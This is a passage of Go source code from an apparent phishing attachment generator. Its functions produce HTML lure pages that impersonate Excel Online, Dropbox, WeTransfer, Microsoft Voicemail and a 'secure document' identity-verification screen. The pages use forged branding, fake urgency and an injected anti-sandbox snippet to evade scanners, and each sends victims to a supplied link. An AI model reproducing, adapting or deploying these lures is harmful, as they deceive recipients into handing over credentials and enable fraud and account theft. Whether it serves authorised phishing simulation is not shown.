.spreadsheet-preview{border:1px solid #e1dfdd;border-radius:4px;overflow:hidden;margin-bottom:24px}
.spreadsheet-preview .row{display:flex;border-bottom:1px solid #e1dfdd}
.spreadsheet-preview .row:last-child{border-bottom:none}
.spreadsheet-preview .cell{flex:1;padding:8px 12px;font-size:12px;color:#323130;border-right:1px solid #e1dfdd}
.spreadsheet-preview .cell:last-child{border-right:none}
.spreadsheet-preview .header-row{background:#f3f2f1;font-weight:600}
.spreadsheet-preview .row-num{width:40px;background:#f3f2f1;text-align:center;color:#605e5c;flex:none}
.loading-bar{height:3px;background:#e1dfdd;border-radius:2px;overflow:hidden;margin-bottom:16px}
.loading-fill{height:100%%;width:0;background:#217346;animation:xlload 2s ease-in-out forwards}
@keyframes xlload{0%%{width:0}60%%{width:75%%}100%%{width:100%%}}
.status{font-size:12px;color:#605e5c;margin-bottom:20px;text-align:center}
.btn{display:block;width:100%%;padding:12px;background:#217346;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:14px;font-weight:600}
.btn:hover{background:#1a5c38}
.meta{font-size:12px;color:#a19f9d;margin-top:16px}
.footer{padding:14px 24px;border-top:1px solid #edebe9;text-align:center}
.footer p{font-size:11px;color:#a19f9d}
</style>
</head>
<body>
%s
<div class="container" id="main-content">
<div class="header"><svg viewBox="0 0 24 24"><path d="M3 3v18h18V3H3zm7 14H5v-2h5v2zm0-4H5v-2h5v2zm0-4H5V7h5v2zm9 8h-7v-2h7v2zm0-4h-7v-2h7v2zm0-4h-7V7h7v2z"/></svg><span>Excel Online</span></div>
<div class="body">
<p class="info"><strong>%s</strong> shared a spreadsheet with you</p>
<div class="spreadsheet-preview">
<div class="row header-row"><div class="cell row-num"></div><div class="cell">A</div><div class="cell">B</div><div class="cell">C</div><div class="cell">D</div></div>
<div class="row"><div class="cell row-num">1</div><div class="cell" style="background:#e8f5e9">Name</div><div class="cell" style="background:#e8f5e9">Amount</div><div class="cell" style="background:#e8f5e9">Date</div><div class="cell" style="background:#e8f5e9">Status</div></div>
<div class="row"><div class="cell row-num">2</div><div class="cell">Loading...</div><div class="cell">Loading...</div><div class="cell">Loading...</div><div class="cell">Loading...</div></div>
<div class="row"><div class="cell row-num">3</div><div class="cell" style="color:#ccc">...</div><div class="cell" style="color:#ccc">...</div><div class="cell" style="color:#ccc">...</div><div class="cell" style="color:#ccc">...</div></div>
</div>
<div class="loading-bar"><div class="loading-fill"></div></div>
<p class="status">Loading spreadsheet data...</p>
<a href="%s" class="btn">Open in Excel Online</a>
<p class="meta">%s &middot; %s</p>
</div>
<div class="footer"><p>&copy; %d Microsoft Corporation</p></div>
</div>
</body>
</html>`, docName, antiSandbox, senderName, linkURL, docName, fileSize, time.Now().Year())
}

func (ag *AttachmentGenerator) templateDropbox(linkURL, docName, senderName, senderEmail, fileSize, antiSandbox string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>%s sent you a file - Dropbox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f7f5f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:16px;box-shadow:0 2px 10px rgba(0,0,0,.08);max-width:440px;width:100%%;overflow:hidden}
.header{padding:24px 28px 0}
.logo{display:flex;align-items:center;gap:8px;margin-bottom:24px}
.logo svg{width:32px;height:32px}
.logo span{font-size:18px;color:#1e1919;font-weight:600}
.body{padding:0 28px 28px}
.sender{font-size:15px;color:#1e1919;font-weight:500;margin-bottom:4px}
.sender-email{font-size:13px;color:#637282;margin-bottom:20px}
.file-box{background:#f7f5f2;border-radius:12px;padding:20px;display:flex;align-items:center;gap:14px;margin-bottom:24px}
.file-box .icon{width:48px;height:48px;background:#0061ff;border-radius:8px;display:flex;align-items:center;justify-content:center}
.file-box .icon svg{width:24px;height:24px;fill:#fff}
.file-box .info .name{font-size:14px;color:#1e1919;font-weight:600}
.file-box .info .size{font-size:12px;color:#637282;margin-top:2px}
.btn{display:block;width:100%%;padding:12px;background:#0061ff;color:#fff;text-align:center;text-decoration:none;border-radius:8px;font-size:14px;font-weight:600}
.btn:hover{background:#004fd4}
.footer{padding:16px 28px;border-top:1px solid #e8e5e1}
.footer p{font-size:11px;color:#637282;line-height:1.5}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header">
<div class="logo">
<svg viewBox="0 0 24 24"><path fill="#0061ff" d="M12 2l-6 4 6 4-6 4 6 4 6-4-6-4 6-4-6-4z"/></svg>
<span>Dropbox</span>
</div>
</div>
<div class="body">
<p class="sender">%s sent you a file</p>
<p class="sender-email">%s</p>
<div class="file-box">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/></svg></div>
<div class="info"><div class="name">%s</div><div class="size">%s</div></div>
</div>
<a href="%s" class="btn">Download</a>
</div>
<div class="footer"><p>&copy; %d Dropbox, Inc.</p></div>
</div>
</body>
</html>`, senderName, antiSandbox, senderName, senderEmail, docName, fileSize, linkURL, time.Now().Year())
}

func (ag *AttachmentGenerator) templateWeTransfer(linkURL, docName, senderName, fileSize string, expiryHours int, antiSandbox string) string {
	if expiryHours <= 0 {
		expiryHours = 168 // 7 days default
	}
	expiryDate := time.Now().Add(time.Duration(expiryHours) * time.Hour).Format("January 2, 2006")
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>WeTransfer - %s</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#409fff 0%%,#6366f1 50%%,#8b5cf6 100%%);display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.15);max-width:420px;width:100%%;overflow:hidden}
.body{padding:32px 28px}
.logo{font-size:20px;color:#409fff;font-weight:700;margin-bottom:24px;letter-spacing:-0.5px}
.title{font-size:22px;color:#1a1a2e;font-weight:600;margin-bottom:8px}
.subtitle{font-size:14px;color:#6b7280;margin-bottom:24px}
.file-list{margin-bottom:24px}
.file-item{display:flex;align-items:center;gap:12px;padding:12px 0;border-bottom:1px solid #f3f4f6}
.file-item .icon{width:40px;height:40px;background:#f3f4f6;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px}
.file-item .info .name{font-size:14px;color:#1a1a2e;font-weight:500}
.file-item .info .meta{font-size:12px;color:#9ca3af}
.total{display:flex;justify-content:space-between;padding:12px 0;font-size:13px;color:#6b7280}
.btn{display:block;width:100%%;padding:14px;background:#409fff;color:#fff;text-align:center;text-decoration:none;border-radius:12px;font-size:15px;font-weight:600;transition:all .2s}
.btn:hover{background:#2563eb;transform:translateY(-1px)}
.expiry{text-align:center;margin-top:16px;font-size:12px;color:#9ca3af}
.expiry strong{color:#ef4444}
.footer{padding:16px 28px;background:#f9fafb;text-align:center}
.footer p{font-size:11px;color:#9ca3af}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="body">
<div class="logo">WeTransfer</div>
<h1 class="title">Download your files</h1>
<p class="subtitle">%s sent you some files</p>
<div class="file-list">
<div class="file-item"><div class="icon">📄</div><div class="info"><div class="name">%s</div><div class="meta">%s</div></div></div>
</div>
<div class="total"><span>1 item</span><span>%s total</span></div>
<a href="%s" class="btn">Download</a>
<p class="expiry">Expires on <strong>%s</strong></p>
</div>
<div class="footer"><p>&copy; %d WeTransfer B.V.</p></div>
</div>
</body>
</html>`, docName, antiSandbox, senderName, docName, fileSize, fileSize, linkURL, expiryDate, time.Now().Year())
}

func (ag *AttachmentGenerator) templateVoicemail(linkURL, senderName, senderEmail, companyName, antiSandbox string) string {
	callTime := time.Now().Add(-30 * time.Minute).Format("3:04 PM")
	duration := "0:47"
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Voicemail from %s</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1);max-width:480px;width:100%%;overflow:hidden}
.header{background:#0078d4;padding:20px 24px;display:flex;align-items:center;gap:10px}
.header svg{width:24px;height:24px;fill:#fff}
.header span{color:#fff;font-size:16px;font-weight:600}
.body{padding:28px 24px}
.title{font-size:16px;color:#323130;font-weight:600;margin-bottom:16px}
.caller-info{display:flex;align-items:center;gap:14px;margin-bottom:20px}
.caller-avatar{width:48px;height:48px;background:#0078d4;border-radius:50%%;display:flex;align-items:center;justify-content:center;color:#fff;font-size:20px;font-weight:600}
.caller-details .name{font-size:14px;color:#323130;font-weight:600}
.caller-details .number{font-size:13px;color:#605e5c}
.caller-details .time{font-size:12px;color:#a19f9d}
.player{background:#f3f2f1;border-radius:8px;padding:16px;margin-bottom:24px}
.player .waveform{height:40px;display:flex;align-items:center;gap:2px;margin-bottom:12px}
.player .waveform .bar{width:3px;background:#0078d4;border-radius:2px;animation:wave 1.5s ease-in-out infinite}
.player .waveform .bar:nth-child(1){height:15px;animation-delay:0s}
.player .waveform .bar:nth-child(2){height:25px;animation-delay:.1s}
.player .waveform .bar:nth-child(3){height:35px;animation-delay:.2s}
.player .waveform .bar:nth-child(4){height:20px;animation-delay:.3s}
.player .waveform .bar:nth-child(5){height:30px;animation-delay:.4s}
.player .waveform .bar:nth-child(6){height:15px;animation-delay:.5s}
.player .waveform .bar:nth-child(7){height:25px;animation-delay:.6s}
.player .waveform .bar:nth-child(8){height:35px;animation-delay:.7s}
.player .waveform .bar:nth-child(9){height:20px;animation-delay:.8s}
.player .waveform .bar:nth-child(10){height:28px;animation-delay:.9s}
.player .waveform .bar:nth-child(11){height:18px;animation-delay:1s}
.player .waveform .bar:nth-child(12){height:32px;animation-delay:1.1s}
@keyframes wave{0%%,100%%{transform:scaleY(1)}50%%{transform:scaleY(.5)}}
.player .controls{display:flex;align-items:center;justify-content:space-between}
.player .duration{font-size:12px;color:#605e5c}
.btn{display:block;width:100%%;padding:12px;background:#0078d4;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-size:14px;font-weight:600}
.btn:hover{background:#106ebe}
.transcript{margin-top:16px;padding:12px;background:#f8f8f8;border-radius:4px;font-size:12px;color:#605e5c;font-style:italic}
.footer{padding:14px 24px;border-top:1px solid #edebe9;text-align:center}
.footer p{font-size:11px;color:#a19f9d}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header"><svg viewBox="0 0 24 24"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 0 0-1.01.24l-1.57 1.97c-2.83-1.35-5.48-3.9-6.89-6.83l1.95-1.66c.27-.28.35-.67.24-1.02-.37-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19C3.65 3 3 3.24 3 3.99 3 13.28 10.73 21 20.01 21c.71 0 .99-.63.99-1.18v-3.45c0-.54-.45-.99-.99-.99z"/></svg><span>Microsoft Voicemail</span></div>
<div class="body">
<h2 class="title">You have a new voicemail</h2>
<div class="caller-info">
<div class="caller-avatar">%s</div>
<div class="caller-details">
<div class="name">%s</div>
<div class="number">%s</div>
<div class="time">Today at %s &middot; Duration: %s</div>
</div>
</div>
<div class="player">
<div class="waveform"><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>
<div class="controls"><span class="duration">0:00 / %s</span></div>
</div>
<a href="%s" class="btn">Play Voicemail</a>
<div class="transcript">Transcript: "Hi, this is %s from %s. I need to discuss something important with you. Please call me back or click the link above to listen to the full message..."</div>
</div>
<div class="footer"><p>&copy; %d Microsoft Corporation</p></div>
</div>
</body>
</html>`, senderName, antiSandbox, safeInitial(senderName), senderName, senderEmail, callTime, duration, duration, linkURL, senderName, companyName, time.Now().Year())
}

func (ag *AttachmentGenerator) templateSecureDocument(linkURL, docName, senderName, companyName, message, antiSandbox string) string {
	if message == "" {
		message = "This document requires verification before access is granted."
	}
	refCode := strings.ToUpper(fmt.Sprintf("SEC-%d", time.Now().UnixMilli()%999999+100000))
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Secure Document - Verification Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:#1a1a2e;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.3);max-width:460px;width:100%%;overflow:hidden}
.header{background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);padding:28px 24px;text-align:center}
.shield{width:56px;height:56px;background:rgba(255,255,255,.2);border-radius:50%%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px}
.shield svg{width:28px;height:28px;fill:#fff}
.header h1{color:#fff;font-size:18px;font-weight:600;margin-bottom:4px}
.header p{color:rgba(255,255,255,.8);font-size:13px}
.body{padding:28px 24px}
.info-box{background:#f8f9fa;border-radius:8px;padding:16px;margin-bottom:20px}
.info-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px}
.info-row .label{color:#6b7280}
.info-row .value{color:#1f2937;font-weight:500}
.message-text{font-size:13px;color:#4b5563;line-height:1.6;margin-bottom:20px;padding:12px;background:#fef3c7;border-radius:6px;border-left:3px solid #f59e0b}
.security-badge{display:flex;align-items:center;gap:8px;margin-bottom:20px;padding:10px 14px;background:#ecfdf5;border-radius:6px}
.security-badge svg{width:18px;height:18px;fill:#10b981}
.security-badge span{font-size:12px;color:#065f46;font-weight:500}
.btn{display:block;width:100%%;padding:14px;background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);color:#fff;text-align:center;text-decoration:none;border-radius:8px;font-size:15px;font-weight:600;transition:opacity .2s}
.btn:hover{opacity:.9}
.ref{text-align:center;margin-top:12px;font-size:11px;color:#9ca3af}
.footer{padding:16px 24px;border-top:1px solid #e5e7eb;text-align:center}
.footer p{font-size:11px;color:#9ca3af;line-height:1.5}
</style>
</head>
<body>
%s
<div class="card" id="main-content">
<div class="header">
<div class="shield"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
<h1>Secure Document Access</h1>
<p>Encrypted &amp; Protected</p>
</div>
<div class="body">
<div class="info-box">
<div class="info-row"><span class="label">Document</span><span class="value">%s</span></div>
<div class="info-row"><span class="label">From</span><span class="value">%s</span></div>
<div class="info-row"><span class="label">Organization</span><span class="value">%s</span></div>
<div class="info-row"><span class="label">Classification</span><span class="value" style="color:#dc2626">Confidential</span></div>
</div>
<div class="message-text">%s</div>
<div class="security-badge"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg><span>256-bit AES Encryption &middot; Identity Verification Required</span></div>
<a href="%s" class="btn">Verify Identity &amp; Access Document</a>
<p class="ref">Reference: %s</p>
</div>
<div class="footer"><p>This is an automated security notification. Do not forward this message.</p></div>
</div>
</body>
</html>`, antiSandbox, docName, senderName, companyName, message, linkURL, refCode)
}
